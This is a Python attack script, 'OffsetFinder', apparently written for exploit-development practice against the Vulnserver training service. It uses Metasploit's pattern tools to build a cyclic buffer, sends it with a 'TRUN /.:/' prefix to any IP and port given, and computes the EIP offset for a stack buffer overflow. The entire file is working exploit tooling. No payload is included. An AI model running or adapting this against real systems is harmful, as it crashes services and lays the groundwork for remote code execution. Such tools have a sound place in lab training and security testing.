#!/usr/bin/env python3
import sys
import re
import socket
import argparse
import subprocess
from color_print import print_success, print_error, print_info

def generate_pattern(length):
    try:
        result = subprocess.run(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)], capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print_error(f"Error: {e}")
        sys.exit(1)

def offset_finder(pattern_value):
    try:
        result = subprocess.run(["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-q", pattern_value], capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print_error(f"Error: {e}")
        sys.exit(1)

def extract_offset(output):
    match = re.search(r"offset (\d+)", output)
    if match:
        return int(match.group(1))
    return None

def main():
    parser = argparse.ArgumentParser(description="Offset Finder Tool. OffsetFinder v1.0")
    parser.add_argument("-ip", type=str, help="The target IP address.", required=True)
    parser.add_argument("-port", type=int, help="The target port.", required=True)
    parser.add_argument("-size", type=int, help="Buffer size to send. (default:2000)", default=2000,required=True)
    parser.add_argument("-value", type=str, help="The value of EIP. (e.g. 386F4337 )", required=False)
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    buffer_size = args.size
    value = args.value
    pattern = generate_pattern(buffer_size)
    pattern_value = offset_finder(value) if value else None
    print(f"[+] Generated pattern of length {buffer_size}")

  
    try:
        print(f"[+] Pattern generated. Sending to {ip}:{port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        payload = b"TRUN /.:/" + pattern.encode()
        s.send(payload)
        try:
            s.settimeout(10)
            response = s.recv(1024)
            print(f"[+] Received response: {response[:100]}...")
        except socket.timeout:
            print_info("No response received.")
        finally:
            s.close()

        print_info(f"Sent {len(payload)} bytes to {ip}:{port}")
        print("[+] Check the debugger for the exact offset.")

        if pattern_value:
            print_success(f"Finding offset for value: {pattern_value}")
            offset_result = offset_finder(value)
           # print_success(f"Offset result: {offset_result}")
            offset_value = extract_offset(offset_result)
            if offset_value is not None:
                print_success(f"Exact offset found at: {offset_value}")
        else:
            print_info("No pattern value provided for offset finding.")
    except Exception as e:
        print_error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()